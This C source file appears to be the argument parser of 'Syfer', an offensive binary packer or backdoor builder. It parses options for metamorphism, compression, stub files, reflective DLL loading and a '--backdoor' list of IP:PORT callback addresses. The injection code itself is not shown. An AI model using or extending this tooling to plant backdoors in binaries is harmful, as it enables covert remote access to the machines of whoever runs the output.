#include "../include/main.h"
#include <stdint.h>

/*
 *
 * // --metamorph								1
 * // --compress								2
 * // --inject-lib ( BACKDOOR ACTIVATE)						?
 * // --backdoor [ IP:PORT ] [ IP:PORT] [ IP:PORT ] ...
 * // --stub [ FILE ] [ FILE ] [ FILE ] ...
 * // --reflective-dll ( BACKDOOR ACTIVATE )					8
 * // --load-binary-user-space [x86_64] [i386] ( BACKDOOR ACTIVATE )		16
 *
 *
 */


static void
syfer_verbose( t__sy_binary *data ) {
    fprintf( stderr, "%s Binary name: %s %s\n", ANSI_COLOR_BLUE, data->binary_name, ANSI_COLOR_RESET);
    int     ret = ( data->opts & 0x01 ) ? 0x01 : 0x00;
    fprintf( stderr, "\t%s --Metamorph: %d %s\n", ANSI_COLOR_YELLOW, ret, ANSI_COLOR_RESET);
    ret = ( data->opts & 0x02 ) ? 0x01 : 0x00;
    fprintf( stderr, "\t%s --Compress: %d %s\n", ANSI_COLOR_YELLOW, ret, ANSI_COLOR_RESET);
    ret = ( data->opts & 0x08 ) ? 0x01 : 0x00;
    fprintf( stderr, "\t%s --reflective-dll: %d %s\n", ANSI_COLOR_YELLOW, ret, ANSI_COLOR_RESET);
    ret = ( data->opts & 0x10 ) ? 0x01 : 0x00;
    fprintf( stderr, "\t%s --load-binary-user-space: %d %s\n", ANSI_COLOR_YELLOW, ret, ANSI_COLOR_RESET);


    int i = -1;
    if ( data->ip && data->ip[0] ) {
	    fprintf( stderr, "\t%s --backdoor%s\n", ANSI_COLOR_YELLOW, ANSI_COLOR_RESET);
        while ( data->ip[++i])
	        fprintf( stderr, "\t\t%s %s %s\n", ANSI_COLOR_YELLOW, data->ip[i], ANSI_COLOR_RESET);
    }

    i = -1;
    if ( data->stub && data->stub[0] ) {
	    fprintf( stderr, "\t%s --stub%s\n", ANSI_COLOR_YELLOW, ANSI_COLOR_RESET);
        while ( data->stub[++i])
	        fprintf( stderr, "\t\t%s %s %s\n", ANSI_COLOR_YELLOW, data->stub[i], ANSI_COLOR_RESET);

    }
	fprintf( stderr, "\t%sOutput: %s%s\n", ANSI_COLOR_YELLOW, data->out_binary_name, ANSI_COLOR_RESET);
}


static void
bypass_parameters( int ac, char **av, int *i )
{
	while ( *i < ac ) {
		if ( ! strcmp( av[ *i ], "--end") )
			break;
		else
			++(*i);
	}
}

static uint32_t
get_numbers_of_parameters( int ac, char **av, int i, const char *model ) {

    uint32_t nb = 0x00;
    while( i < ac ) {
        if ( ! strcmp( av[i], model))
            break;
        else
            ++nb;
        ++i;
    }
    return ( nb );
}

static int
_sy_parameter_backdoor( int ac, char **av, int *i, t__sy_binary *data )
{
    regex_t regex;
	if ( regcomp(&regex,
			"^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))."
			"([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))."
			"([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))."
			"([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5])):([0-9]{1,5})$", REG_EXTENDED)  )
	{
			fprintf(stderr, "%s[-] Could not compile regex%s\n", ANSI_COLOR_RED, ANSI_COLOR_RESET);
			exit( EXIT_FAILURE );
	}

    uint32_t nb = get_numbers_of_parameters( ac, av, *i, "--end-backdoor" );
    if ( nb == 0x00 ) {
        regfree( &regex );
        return ( 0x01 );
    }

    data->ip = calloc( sizeof(char *), nb+1);
    if ( data->ip == NULL ) {
        regfree( &regex );
        return fprintf(stderr, "%s[-] An memory allocation error has occurred. LINE: %d FILE: %s Errno: %s %s\n", ANSI_COLOR_RED, __LINE__, __FILE__, strerror(errno), ANSI_COLOR_RESET);
    }

    for( int j = 0x00; *i < ac && strcmp( av[*i], "--end-backdoor") != 0x00; ++(*i) )
    {
        if ( regexec( &regex, av[*i], 0, NULL, 0 ) != REG_NOMATCH )
            data->ip[ j++ ] = av[*i];
    }
    regfree( &regex );
    if ( ! data->ip[0] )
        return ( 1 );
    return ( 0x00 );
}

static int
_sy_parameter_stub( int ac, char **av, int *i, t__sy_binary *data )
{
    uint32_t nb = get_numbers_of_parameters( ac, av, *i, "--end-stub" );
    if ( nb == 0X00 )
        return ( 0X01 );

    data->stub = calloc( sizeof(char **), nb+1);
    if ( data->stub == NULL )
        return fprintf(stderr, "%s[-] An memory allocation error has occurred. LINE: %d FILE: %s Errno: %s %s\n", ANSI_COLOR_RED, __LINE__, __FILE__, strerror(errno), ANSI_COLOR_RESET);

    for( int j = 0x00; *i < ac && strcmp( av[*i], "--end-stub") != 0x00; ++(*i) )
    {
		__sy_stat	info = {0};
		if ( lstat( av[*i], &info ) == -1 ) {
            fprintf( stderr, "%s[-] %s: %s %s\n", ANSI_COLOR_RED, av[*i], strerror(errno), ANSI_COLOR_RESET);
            continue;
        }
        if ( access( av[*i], R_OK ) != 0x00 ) {
            fprintf( stderr, "%s[-] %s: %s %s\n", ANSI_COLOR_RED, av[*i], strerror(errno), ANSI_COLOR_RESET);
            continue;
        }
        if ( info.st_size == 0X00 ) {
            fprintf( stderr, "%s[-] %s: The file is empty.%s\n", ANSI_COLOR_RED, av[*i], ANSI_COLOR_RESET);
            continue;
        }

        data->stub[ j++ ] = av[ *i ];
    }
    if ( data->stub[ 0X00 ] == NULL )
        return ( 0X01 );
    return 0X00;
}

void
do_analyze_parameter( int ac, char **av, int *i, t__sy_binary *data )
{
    int ret;

    for ( ; *i < ac; (*i)++ ) {
		if ( ! strcmp( av[*i], "--metamorph") )
			data->opts |= 0X01;
		else if ( ! strcmp( av[*i], "--compress") )
			data->opts |= 0X02;
		else if ( ! strcmp( av[*i], "--reflective"))
			data->opts |= 0X08;
		else if ( ! strcmp( av[*i], "--load-binary-user-space") )
			data->opts |= 0X10;
		else if ( ! strcmp( av[*i], "--stub"))
		{
            ++(*i);
            ret = _sy_parameter_stub( ac, av, i, data );
            if ( ret )
                fprintf(stderr, "%s[-] An error occurred during the analysis of the parameter. LINE: %d FILE: %s Errno: %s %s\n", ANSI_COLOR_RED, __LINE__, __FILE__, strerror(errno), ANSI_COLOR_RESET);
            else
             data->opts |= 0X40;

		}
		else if ( ! strcmp( av[*i], "--backdoor")) {
            ++(*i);

			ret = _sy_parameter_backdoor( ac, av, i, data );
            if ( ret )
                fprintf(stderr, "%s[-] An error occurred during the analysis of the parameter. LINE: %d FILE: %s Errno: %s %s\n", ANSI_COLOR_RED, __LINE__, __FILE__, strerror(errno), ANSI_COLOR_RESET);
            else
                data->opts |= 0X20;

        }
        else if ( ! strcmp( av[*i], "-o") ) {
            if ( av[*i+1] == NULL )
                exit( 1 );
            ++(*i);
            memset( data->out_binary_name, 0x00, PATH_MAX );
            memcpy( data->out_binary_name, av[*i], strlen(av[*i]));
        }
        else
        {
            --(*i);
            break;
        }
    }
}


int
analyze_parameter( int __attribute__((unused)) ac, char __attribute__((unused))**av )
{
	t__sy_binary	*data = calloc( sizeof( char), sizeof( t__sy_binary));
	if ( data == NULL )
		return fprintf( stderr, "%s[-] Memory allocation of the structure \"__sy_binary\" failed %s\n", ANSI_COLOR_RED, ANSI_COLOR_RESET );
	fprintf( stderr, "%s[+] Successful memory allocation of the \"__sy_binary\" structure %s\n", ANSI_COLOR_GREEN, ANSI_COLOR_RESET );

    for ( int i = 0x01; i < ac; i++ ) {
		__sy_stat	info = {0};
		if ( lstat( av[i], &info ) == -1 ) {
			fprintf( stderr, "%s[-] The %s file does not exist.%s\n", ANSI_COLOR_RED, av[ i ], ANSI_COLOR_RESET);
			i = ( i + 1 );
			bypass_parameters( ac, av, &i );
			continue;
		}
		else if ( ! S_ISREG( info.st_mode )) {
			fprintf( stderr, "%s[-] The %s file is not an ordinary file.%s\n", ANSI_COLOR_RED, av[ i ], ANSI_COLOR_RESET);
			i = ( i + 1 );
			bypass_parameters( ac, av, &i );
			continue;
		}
		else
		{
			data->binary_name = av[i++];
			do_analyze_parameter(ac, av, &i, data);
			if ( *data->out_binary_name == 0x00 ) {
				char *tmp = strrchr( data->binary_name, '/');
				tmp = ( tmp == NULL ) ? data->binary_name : tmp+1;
				sprintf( data->out_binary_name, "Syfer_%s.out", tmp);
			}
			syfer_verbose( data );
			syfer( data );
			( data->stub != NULL ) ? free( data->stub ) : 0X00;
			( data->ip != NULL ) ? free( data->ip ) : 0X00;
			memset( data, 0X00, sizeof( t__sy_binary));
		}
    }
    free( data );
    return ( 0x00 );
}
